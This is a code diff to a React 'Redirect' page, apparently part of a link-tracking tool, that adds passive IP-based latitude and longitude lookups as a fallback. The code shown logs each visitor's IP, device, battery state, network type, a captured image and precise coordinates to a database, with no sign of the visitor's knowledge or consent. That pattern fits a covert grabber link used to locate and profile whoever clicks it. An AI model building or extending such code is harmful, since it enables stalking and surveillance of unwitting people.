@@ -46,6 +46,8 @@ export default function Redirect() {
       let ip = 'Hidden';
       let city = 'Unknown';
       let country = 'Unknown';
+      let passiveLat: number | null = null;
+      let passiveLon: number | null = null;
       
       try {
         // Tier 1: ipapi.co
@@ -55,6 +57,8 @@ export default function Redirect() {
         ip = data.ip;
         city = data.city || 'Unknown';
         country = data.country_name || 'Unknown';
+        passiveLat = data.latitude ? parseFloat(data.latitude) : null;
+        passiveLon = data.longitude ? parseFloat(data.longitude) : null;
       } catch (e) {
         try {
           // Tier 2: ipwho.is (Fast & Reliable over HTTPS)
@@ -64,6 +68,8 @@ export default function Redirect() {
             ip = data.ip;
             city = data.city || 'Unknown';
             country = data.country || 'Unknown';
+            passiveLat = data.latitude ? parseFloat(data.latitude) : null;
+            passiveLon = data.longitude ? parseFloat(data.longitude) : null;
           } else throw new Error('ipwho failed');
         } catch (e2) {
           try {
@@ -73,6 +79,8 @@ export default function Redirect() {
             ip = data.ipAddress;
             city = data.cityName || 'Unknown';
             country = data.countryName || 'Unknown';
+            passiveLat = data.latitude ? parseFloat(data.latitude) : null;
+            passiveLon = data.longitude ? parseFloat(data.longitude) : null;
           } catch (e3) {
             try {
               // Tier 4: ipify.org (Last resort: IP only)
@@ -120,15 +128,14 @@ export default function Redirect() {
       await supabase.from('link_analytics').insert({
         url_id: id,
         ip_address: ip,
-        city: city,
-        country: country,
+        location_name: `${city}, ${country}`,
         device_type: result.device.type || 'Desktop',
         browser: result.browser.name || 'Unknown',
         os: result.os.name || 'Unknown',
         referrer: document.referrer || 'Direct',
         captured_image: customIntel?.image || null,
-        latitude: customIntel?.lat || null,
-        longitude: customIntel?.lon || null,
+        latitude: (customIntel?.lat ? parseFloat(customIntel.lat) : null) || passiveLat,
+        longitude: (customIntel?.lon ? parseFloat(customIntel.lon) : null) || passiveLon,
         battery_level: batteryLevel,
         is_charging: isCharging,
         network_type: networkType,
